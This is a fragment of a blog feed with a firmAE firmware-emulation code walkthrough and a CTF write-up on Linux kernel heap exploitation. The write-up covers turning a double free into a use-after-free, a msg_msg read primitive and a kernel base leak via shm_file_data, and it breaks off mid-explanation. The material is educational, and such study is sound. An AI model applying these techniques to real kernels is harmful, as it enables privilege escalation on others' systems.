class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ExtractionItem</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Class that encapsulates the state of a single item that is being extracted.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Maximum recursion breadth and depth</span></span><br><span class="line">    RECURSION_BREADTH = <span class="number">10</span></span><br><span class="line">    RECURSION_DEPTH = <span class="number">3</span></span><br><span class="line">    database = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, extractor, path, depth, tag=None, debug=False</span>):</span></span><br><span class="line">        <span class="comment"># Temporary directory</span></span><br><span class="line">        self.temp = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Recursion depth counter</span></span><br><span class="line">        self.depth = depth</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Reference to parent extractor object</span></span><br><span class="line">        self.extractor = extractor</span><br><span class="line"></span><br><span class="line">        <span class="comment"># File path</span></span><br><span class="line">        self.item = path</span><br><span class="line"></span><br><span class="line">        self.debug = debug</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Database connection</span></span><br><span class="line">        <span class="keyword">if</span> self.extractor.database:</span><br><span class="line">            <span class="keyword">import</span> psycopg2</span><br><span class="line">            self.database = psycopg2.connect(database=<span class="string">&quot;firmware&quot;</span>,</span><br><span class="line">                                             user=<span class="string">&quot;firmadyne&quot;</span>,</span><br><span class="line">                                             password=<span class="string">&quot;firmadyne&quot;</span>,</span><br><span class="line">                                             host=self.extractor.database)</span><br><span class="line">            </span><br><span class="line">        <span class="comment"># Checksum</span></span><br><span class="line">        self.checksum = Extractor.io_md5(path)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Tag</span></span><br><span class="line">        self.tag = tag <span class="keyword">if</span> tag <span class="keyword">else</span> self.generate_tag()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Output file path and filename prefix</span></span><br><span class="line">        self.output = os.path.join(self.extractor.output_dir, self.tag) <span class="keyword">if</span> \</span><br><span class="line">                                   self.extractor.output_dir <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Status, with terminate indicating early termination for this item</span></span><br><span class="line">        self.terminate = <span class="literal">False</span></span><br><span class="line">        self.status = <span class="literal">None</span></span><br><span class="line">        self.update_status()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__del__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.database:</span><br><span class="line">            self.database.close()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.temp:</span><br><span class="line">            self.printf(<span class="string">&quot;&gt;&gt; Cleaning up %s...&quot;</span> % self.temp)</span><br><span class="line">            Extractor.io_rm(self.temp)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">printf</span>(<span class="params">self, fmt</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Prints output string with appropriate depth indentation.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> self.debug:</span><br><span class="line">            print((<span class="string">&quot;\t&quot;</span> * self.depth + fmt))</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p><code>generate_tag</code>函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_tag</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Generate the filename tag.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> self.database:</span><br><span class="line">        <span class="keyword">return</span> os.path.basename(self.item) + <span class="string">&quot;_&quot;</span> + self.checksum</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        image_id = <span class="literal">None</span></span><br><span class="line">        cur = self.database.cursor()</span><br><span class="line">        <span class="keyword">if</span> self.extractor.brand:</span><br><span class="line">            brand = self.extractor.brand</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            brand = os.path.relpath(self.item).split(os.path.sep)[<span class="number">0</span>]</span><br><span class="line">        cur.execute(<span class="string">&quot;SELECT id FROM brand WHERE name=%s&quot;</span>, (brand, ))</span><br><span class="line">        brand_id = cur.fetchone()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> brand_id:</span><br><span class="line">            cur.execute(<span class="string">&quot;INSERT INTO brand (name) VALUES (%s) RETURNING id&quot;</span>,</span><br><span class="line">                        (brand, ))</span><br><span class="line">            brand_id = cur.fetchone()</span><br><span class="line">        <span class="keyword">if</span> brand_id:</span><br><span class="line">            cur.execute(<span class="string">&quot;SELECT id FROM image WHERE hash=%s&quot;</span>,</span><br><span class="line">                        (self.checksum, ))</span><br><span class="line">            image_id = cur.fetchone()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> image_id:</span><br><span class="line">                cur.execute(<span class="string">&quot;INSERT INTO image (filename, brand_id, hash) \</span></span><br><span class="line"><span class="string">                            VALUES (%s, %s, %s) RETURNING id&quot;</span>,</span><br><span class="line">                            (os.path.basename(self.item), brand_id[<span class="number">0</span>],</span><br><span class="line">                            self.checksum))</span><br><span class="line">                image_id = cur.fetchone()</span><br><span class="line">        self.database.commit()</span><br><span class="line">    <span class="keyword">except</span> BaseException:</span><br><span class="line">        traceback.print_exc()</span><br><span class="line">        self.database.rollback()</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="keyword">if</span> cur:</span><br><span class="line">            cur.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> image_id:</span><br><span class="line">        self.printf(<span class="string">&quot;&gt;&gt; Database Image ID: %s&quot;</span> % image_id[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> str(image_id[<span class="number">0</span>]) <span class="keyword">if</span> \</span><br><span class="line">        image_id <span class="keyword">else</span> os.path.basename(self.item) + <span class="string">&quot;_&quot;</span> + self.checksum</span><br></pre></td></tr></table></figure><h2 id="制作qemu镜像模块"><a href="#制作qemu镜像模块" class="headerlink" title="制作qemu镜像模块"></a>制作qemu镜像模块</h2><p>提取完kernel以及文件系统之后，首先对得到的文件系统检测架构，然后提取内核中核能存在的启动命令，之后就进入到了制作qemu镜像的环节</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ================================</span></span><br><span class="line"><span class="comment"># check architecture</span></span><br><span class="line"><span class="comment"># ================================</span></span><br><span class="line">t_start=<span class="string">&quot;<span class="subst">$(date -u +%s.%N)</span>&quot;</span></span><br><span class="line">ARCH=`./scripts/getArch.py ./images/<span class="variable">$IID</span>.tar.gz <span class="variable">$PSQL_IP</span>`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;ARCH&#125;</span>&quot;</span> &gt; <span class="string">&quot;<span class="variable">$&#123;WORK_DIR&#125;</span>/architecture&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -e ./images/<span class="variable">$&#123;IID&#125;</span>.kernel ]; <span class="keyword">then</span></span><br><span class="line">./scripts/inferKernel.py <span class="variable">$&#123;IID&#125;</span> <span class="comment">#提取内核中可能存在的启动命令</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ ! <span class="string">&quot;<span class="variable">$&#123;ARCH&#125;</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;[\033[31m-\033[0m] Get architecture failed!&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;get architecture fail&quot;</span> &gt; <span class="variable">$&#123;WORK_DIR&#125;</span>/result</span><br><span class="line">    <span class="built_in">return</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> ( check_arch <span class="variable">$&#123;ARCH&#125;</span> == 0 ); <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;[\033[31m-\033[0m] Unknown architecture! - <span class="variable">$&#123;ARCH&#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;not valid architecture : <span class="variable">$&#123;ARCH&#125;</span>&quot;</span> &gt; <span class="variable">$&#123;WORK_DIR&#125;</span>/result</span><br><span class="line">    <span class="built_in">return</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[*] get architecture done!!!&quot;</span></span><br><span class="line">t_end=<span class="string">&quot;<span class="subst">$(date -u +%s.%N)</span>&quot;</span></span><br><span class="line">time_arch=<span class="string">&quot;<span class="subst">$(bc &lt;&lt;&lt;<span class="string">&quot;<span class="variable">$t_end</span>-<span class="variable">$t_start</span>&quot;</span>)</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$time_arch</span> &gt; <span class="variable">$&#123;WORK_DIR&#125;</span>/time_arch</span><br></pre></td></tr></table></figure><p>然后进入到了就是调用<code>makeImage.sh</code>进行qemu镜像的制作，主要的方法是通过挂在一个分区然后将得到的文件系统给拷贝进去，再把一些需要用到的文件：比如<code>firmadyne</code>的文件(libnvram之类的)给拷进去然后再umount。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! egrep -sqi <span class="string">&quot;true&quot;</span> <span class="variable">$&#123;WORK_DIR&#125;</span>/web); <span class="keyword">then</span></span><br><span class="line">    <span class="comment"># ================================</span></span><br><span class="line">    <span class="comment"># make qemu image</span></span><br><span class="line">    <span class="comment"># ================================</span></span><br><span class="line">    t_start=<span class="string">&quot;<span class="subst">$(date -u +%s.%N)</span>&quot;</span></span><br><span class="line">    ./scripts/tar2db.py -i <span class="variable">$IID</span> -f ./images/<span class="variable">$IID</span>.tar.gz -h <span class="variable">$PSQL_IP</span> \ </span><br><span class="line">        2&gt;&amp;1 &gt; <span class="variable">$&#123;WORK_DIR&#125;</span>/tar2db.log </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;this???&quot;</span></span><br><span class="line">    t_end=<span class="string">&quot;<span class="subst">$(date -u +%s.%N)</span>&quot;</span></span><br><span class="line">    time_tar=<span class="string">&quot;<span class="subst">$(bc &lt;&lt;&lt;<span class="string">&quot;<span class="variable">$t_end</span>-<span class="variable">$t_start</span>&quot;</span>)</span>&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$time_tar</span> &gt; <span class="variable">$&#123;WORK_DIR&#125;</span>/time_tar </span><br><span class="line">    t_start=<span class="string">&quot;<span class="subst">$(date -u +%s.%N)</span>&quot;</span></span><br><span class="line">    ./scripts/makeImage.sh <span class="variable">$IID</span> <span class="variable">$ARCH</span> <span class="variable">$FILENAME</span> \</span><br><span class="line">        2&gt;&amp;1 &gt; <span class="variable">$&#123;WORK_DIR&#125;</span>/makeImage.log</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;END????&quot;</span></span><br><span class="line">    t_end=<span class="string">&quot;<span class="subst">$(date -u +%s.%N)</span>&quot;</span></span><br><span class="line">    time_image=<span class="string">&quot;<span class="subst">$(bc &lt;&lt;&lt;<span class="string">&quot;<span class="variable">$t_end</span>-<span class="variable">$t_start</span>&quot;</span>)</span>&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$time_image</span> &gt; <span class="variable">$&#123;WORK_DIR&#125;</span>/time_image</span><br></pre></td></tr></table></figure><h2 id="推断网络接口模块"><a href="#推断网络接口模块" class="headerlink" title="推断网络接口模块"></a>推断网络接口模块</h2><p>这块有点复杂，简而言之就是根据hook的内核网络接口推断出一些网络配置，然后生成<code>run.sh</code>(包含了qemu运行脚本)，运行qemu。</p><p>以后有时间的话把这个坑填了（x</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;因为最近主要工作是iot模拟，包括利用firmadyne,firmAE等去模拟一些路由器然后去进行模糊测试之类的。所以最好还是把firmAE整个框架分析一下，这样才能知道大概去往什么方向去改进以及优化。&lt;/p&gt;
&lt;p&gt;firmAE是在firmadyne基础上进行开发的，它主</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>内核堆利用相关</title>
    <link href="http://phot0n.com/2023/01/19/%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%A9%E7%94%A8%E7%9B%B8%E5%85%B3/"/>
    <id>http://phot0n.com/2023/01/19/%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%A9%E7%94%A8%E7%9B%B8%E5%85%B3/</id>
    <published>2023-01-19T11:31:29.000Z</published>
    <updated>2023-02-07T06:32:53.890Z</updated>
    
    <content type="html"><![CDATA[<p>最近研究了一下内核堆相关的知识点，主要以题解的形式夹杂着整理，也有一些杂七杂八的内容，在此做一下记录仅供参考。因为我也是刚入门pwn的初学者，所以可能记录会有点啰嗦，敬请谅解</p><h1 id="slub分配"><a href="#slub分配" class="headerlink" title="slub分配"></a>slub分配</h1><p>类似ptmalloc2，内核的堆也有一套管理机制，主要有三种:slub、slab、slob。在平时做kernel题时我们主要接触的是slub分配。关于slub分配的原理可以参考<a href="https://blog.csdn.net/lukuen/article/details/6935068">这篇博客</a> ,我认为描述的十分清晰易懂。同时google上应该能搜到不少相关的介绍</p><p>简要地了解之后我们便可以深入题目来理解了，毕竟实战调试才是加深理解的重要手段</p><h1 id="REALWORDCTF-2023-体验赛-Digging-into-Kernel-3"><a href="#REALWORDCTF-2023-体验赛-Digging-into-Kernel-3" class="headerlink" title="[REALWORDCTF 2023 体验赛] Digging-into-Kernel-3"></a>[REALWORDCTF 2023 体验赛] Digging-into-Kernel-3</h1><h2 id="Pre-提取vmlinux获取符号"><a href="#Pre-提取vmlinux获取符号" class="headerlink" title="Pre.提取vmlinux获取符号"></a>Pre.提取vmlinux获取符号</h2><p>这个<a href="https://github.com/marin-m/vmlinux-to-elf">工具</a> 能够是我们获取带有符号信息的文件，方便打断点调试之类的</p><h2 id="Pre-调试准备"><a href="#Pre-调试准备" class="headerlink" title="Pre.调试准备"></a>Pre.调试准备</h2><p>可以修改run.sh以及init文件以便于调试，比如改nokaslr,或者修改为直接root进系统方便查看驱动加载基地址或者.text段地址，方便载入符号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /sys/module/rwctf/sections/.text</span><br></pre></td></tr></table></figure><p>然后在gdb里面载入符号命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add-symbol-file &lt;file&gt; &lt;address&gt; -s &lt;section_name&gt; &lt;section_base&gt;</span><br></pre></td></tr></table></figure><p>不过有个疑问，如果我想对写的exp进行调试该如何加载符号信息?</p><p>我的一个初步的想法是关闭地址偏移，让exp文件的.text基址固定然后<code>add-symbol-file</code>载入exp</p><p>不过由于gdb调试的时候好像自动关闭了ASLR，所以不用手动关闭了。我们只需要通过IDA找出exp的.text基址，然后载入即可</p><p><img src="https://s2.loli.net/2023/01/21/VyJT4sIxB9eQr7i.png" alt=""></p><p>尝试了一下这样雀食是可以在exp上面下断点进行调试的，不过感觉不够优雅（</p><p><img src="https://s2.loli.net/2023/01/21/jh9ziSInlbBqKEM.png" alt=""></p><h2 id="Analysis-简略分析"><a href="#Analysis-简略分析" class="headerlink" title="Analysis.简略分析"></a>Analysis.简略分析</h2><p>把ko文件拖入IDA分析一下，其逻辑非常简单，我们传入的参数是由序号，大小，还有指向需要传入数据的指针构成的，主要问题在于kfree的时候没有将数组对应项置零，从而导致了Double Free。</p><p><img src="https://s2.loli.net/2023/01/21/y1nFNSTMDUtGv5e.png" alt=""></p><p>这个Double Free可以转换成UAF进行利用。比如我们首先通过这个驱动申请一个object，然后free掉，放入freelist，然后再通过一些系统调用之类的在内核空间申请一个(或者堆喷)一些用到这个size的object的结构体，此时这个系统调用控制了这个object，然后我们再通过驱动再次free掉这个object，那么虽然这个系统调用控制了整个object，但是实际上它已经被free掉了，构成了UAF。所以也就是说我们拥有一个任意size的UAF使用。</p><p>朴素来说kernel提权的思路分为两类，一种是通过一些特殊的结构体的一些操作(比如修改tty的函数表)劫持控制流，一种是直接改进程的cred结构体。二者都离不开内核基址的泄露，所以考虑进一步操作之前我们先思考如何泄露基址</p><h2 id="Analysis-内核基址泄露"><a href="#Analysis-内核基址泄露" class="headerlink" title="Analysis.内核基址泄露"></a>Analysis.内核基址泄露</h2><p>题目提供的驱动本身没有提供含有类似<code>copy_to_user</code>这种向用户态返回数据的函数的功能，所以我们需要用一种通用的办法来泄露基址。一个比较通用的办法是利用<code>msg_msg</code>这个结构体，构成”读的原语”</p><p>这个东西是用来实现进程间通信(IPC)的一个东西。用户可以通过如下函数实现相应的功能</p><ul><li>msgget: 创建消息队列</li><li>msgsnd:向指定消息队列发送消息</li><li>msgrcv: 从指定消息队列接收消息</li></ul><p>比如以下是一个简单的创造队列-发送消息-读取消息的例子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msggbuf</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[<span class="number">0x50</span>];</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line">&#125; msg;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    msg.mtype=<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;msg.mtext,<span class="string">&#x27;A&#x27;</span>,<span class="keyword">sizeof</span>(msg.mtext));</span><br><span class="line">    <span class="keyword">int</span> qid = msgget(IPC_PRIVATE,<span class="number">0666</span>|IPC_CREAT);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] QID = %d&quot;</span>,qid);</span><br><span class="line">    msgsnd(qid,&amp;msg,<span class="keyword">sizeof</span>(msg.mtext),<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> * memdump = <span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] MEM_ADDR = %p&quot;</span>,memdump);</span><br><span class="line">    msgrcv(qid,memdump,<span class="number">0x50</span>,<span class="number">0</span>,IPC_NOWAIT |MSG_NOERROR);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,(<span class="keyword">char</span> *)memdump);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意的是发送消息时我们必须用<code>struct msggbuf</code>这样的一个结构体来指定<code>type</code>，然后才是我们传送的内容，然后<code>msgsnd</code>和<code>msgrcv</code>的时候指定的<code>size</code>是不包括这个长整型的长度的(本例中也就是不是0x58而是0x50)，但放入memdump的时候似乎其实会有这个type的</p><p><img src="https://s2.loli.net/2023/01/21/6lC2QTaim7GpOkM.png" alt=""></p><p>介绍完使用之后我们再研究内核对这些消息的处理。</p><p>当通过<code>msgget</code>创建一个消息队列时，内核中会创建这样一个结构体用来表示消息队列</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* one msq_queue structure for each present queue on the system */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kern_ipc_perm</span> <span class="title">q_perm</span>;</span></span><br><span class="line"><span class="keyword">time64_t</span> q_stime;<span class="comment">/* last msgsnd time */</span></span><br><span class="line"><span class="keyword">time64_t</span> q_rtime;<span class="comment">/* last msgrcv time */</span></span><br><span class="line"><span class="keyword">time64_t</span> q_ctime;<span class="comment">/* last change time */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> q_cbytes;<span class="comment">/* current number of bytes on queue */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> q_qnum;<span class="comment">/* number of messages in queue */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> q_qbytes;<span class="comment">/* max number of bytes on queue */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lspid</span>;</span><span class="comment">/* pid of last msgsnd */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lrpid</span>;</span><span class="comment">/* last receive pid */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_messages</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_receivers</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_senders</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p>当通过<code>msgsnd</code>在某个消息队列发送一个消息时，内核中会创造这样一个结构体来表示一个消息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* one msg_msg structure for each message */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line"><span class="keyword">long</span> m_type;</span><br><span class="line"><span class="keyword">size_t</span> m_ts;<span class="comment">/* message text size */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="keyword">void</span> *security;</span><br><span class="line"><span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中<code>struct list_head</code>是内核用来提供表示双向循环链表的一个结构，其定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> &#123;</span></span><br><span class="line">　　<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>调用<code>msgsnd</code>时内核最终会调用<code>alloc_msg()</code>函数来分配空间，形成<code>msg_msg</code>结构体以及相应的消息内容，其规则是这样的</p><ul><li>如果消息内容的大小<strong>小于一个页面的大小减去作为header的msg_msg之后的大小(也就是小于0x1000-0x30=0xfd0)</strong>，内核会分配一个size+header_size大小的object，前面0x30(对应msg_msg结构体的大小)存放msg_msg结构体，后面存放消息内容</li><li>如果消息内容大小<strong>大于页面大小减去msg_msg大小(0xfd0)</strong> 那么内核将以单链表的形式将消息内容分片然后组织起来。具体来说，msg_msg结构体里面的<code>struct msg_msgseg *next;</code>将会起作用。被组织起来的第一个消息称为消息头，剩余的称为segment，图解如下</li></ul><p><img src="https://s2.loli.net/2023/01/21/yZufIjwMREvSBrd.png" alt=""></p><p>容易想到的是，如果我们篡改msg_msg的m_ts,把它改大，那么将会实现越界读取，进一步的如果我们能同时篡改<code>m_ts</code>以及<code>struct msg_msgseg *next;</code>，那么我们将可以实现任意地址读。但是有个问题，为了防止访问错误,<code>struct msg_msgseg *next;</code>指向的<code>segment</code>的前8个字节(也就是对应的segment的<code>struct msg_msgseg *next;</code>最好为NULL)(感觉似乎其他合理地址也行？但是必须保证这个链起来的单链表以NULL结尾)。</p><p>对于本题来说，我们希望有一个包含内核地址的结构体，并且其前8个字节为NULL，这样我们就可以通过UAF进行泄露。而恰好有这样一个结构体满足要求</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shm_file_data</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">vm_operations_struct</span> *<span class="title">vm_ops</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/*输出大致如下</span></span><br><span class="line"><span class="comment">0x0000：0x0000000000000000</span></span><br><span class="line"><span class="comment">0x0008：0xffffffff82292ae0</span></span><br><span class="line"><span class="comment">0x0010：0xffff88800ea09700</span></span><br><span class="line"><span class="comment">0x0018：0xffffffff81e15540</span></span><br><span 